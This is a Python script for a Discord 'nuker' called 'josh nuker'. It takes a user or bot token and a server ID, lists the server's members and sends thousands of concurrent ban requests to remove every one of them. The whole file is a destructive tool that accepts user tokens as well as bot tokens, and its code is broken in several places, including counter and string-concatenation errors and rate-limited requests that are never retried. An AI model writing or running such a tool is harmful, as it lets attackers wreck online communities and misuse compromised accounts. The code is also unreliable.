import asyncio, os, requests
import aiohttp
import tasksio, time
import sys
from pystyle import Colors, Colorate, Center, Write

bans = {}
# slowwrite text for good looking ux
def slow_write(text):
    for x in text: print('' + x, end="");sys.stdout.flush();time.sleep(0.005)



logo= """
      ███                   █████     
     ░░░                   ░░███      
     █████  ██████   █████  ░███████  
    ░░███  ███░░███ ███░░   ░███░░███ 
     ░███ ░███ ░███░░█████  ░███ ░███ 
     ░███ ░███ ░███ ░░░░███ ░███ ░███ 
     ░███ ░░██████  ██████  ████ █████
     ░███  ░░░░░░  ░░░░░░  ░░░░ ░░░░░ 
 ███ ░███                             
░░██████                              
 ░░░░░░                               

"""
print(Center.XCenter(Colorate.Vertical(Colors.blue_to_white, logo, 1)))
token = Write.Input(" Token -> ", Colors.blue_to_white, interval = 0.005)
guild_id = Write.Input(" Guild Id -> ", Colors.blue_to_white, interval=0.005)

os.system("cls ; clear && title josh nuker")

def check_token():
    if requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": f'{token}'}).status_code == 200:
        return "user"
    else:
    
        return "bot"


token_type = check_token()
if token_type == "user":
    headers = {'Authorization': f'{token}'}
   
elif token_type == "bot":
    headers = {'Authorization': f'Bot {token}'}
    
    
async def worker(id):
    async with aiohttp.ClientSession() as session:
        async with session.put(f"https://discord.com/api/v9/guilds/{guild_id}/bans/{id}", headers=headers) as r:
            if r.status == 200:
                print(Center.XCenter(Colorate.Vertical(Colors.purple_to_red + f"Banned {id}")))
            elif r.status == 429:
                b = await r.json()
                print(Center.XCenter(Colorate.Vertical(Colors.purple_to_red + "Ratelimited. Retrying.")))
                await asyncio.sleep(b['retry_after'])
            
                
                
                
                
                
async def main():
    
    async with aiohttp.ClientSession() as ses:
        async with ses.get(f'https://discord.com/api/v9/guilds/{guild_id}/members?limit=1000', headers=headers) as r:
            memberIDS = await r.json()
            print(len(memberIDS))
    async with tasksio.TaskPool(20_000) as pool:
        for member in memberIDS:
            await pool.put(worker(member["user"]["id"]))
            bans += 1
            os.system(f"title josh nuker - Bans = " + bans)
            
            
            
            
            
if __name__ == "__main__":

    asyncio.run(main())
